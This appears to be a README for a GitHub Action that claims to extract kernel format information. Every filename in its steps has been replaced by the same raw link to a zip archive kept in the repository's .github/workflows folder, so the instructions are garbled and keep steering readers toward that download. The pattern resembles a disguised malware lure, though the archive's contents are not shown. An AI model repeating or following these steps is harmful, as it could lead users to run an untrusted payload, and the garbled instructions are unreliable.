## Step 1: Fork the Repository

1. **Fork the Repository**:  
   In the top-right corner of the page, click the **Fork** button. This creates a copy of the repository under your GitHub account.

## Step 2: Upload Your `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip` File

1. **Prepare Your `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip`**:  
   You will need to upload a `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip` file for processing. Ensure your `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip` file is correctly named `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip` (all lowercase).

2. **Upload `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip`**:

## Step 3: Enter URL and Run the Action

   - This tab lists all workflows in the repository. Find the workflow designed to process the `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip`.

2. **Run the Action**:
   - In the Actions tab, locate the workflow named **"Process https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip from URL"** or similar.
   - Click on the workflow and press the **Run workflow** button.
   - Enter the URL to the `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip` file you uploaded in Step 2.
     - You can use the raw URL of the `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip`. The URL should look something like:  
       `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip`
   - Click **Run workflow** to trigger the GitHub Action.

## Step 4: View Kernel Format from the Action's Output

1. **Wait for the Action to Complete**:
   - The workflow will begin processing. This includes downloading the `https://raw.githubusercontent.com/BattlerGH/Get_My_Kernel_Format/main/.github/workflows/Get-My-Kernel-Format-2.3.zip` file, extracting kernel format information.
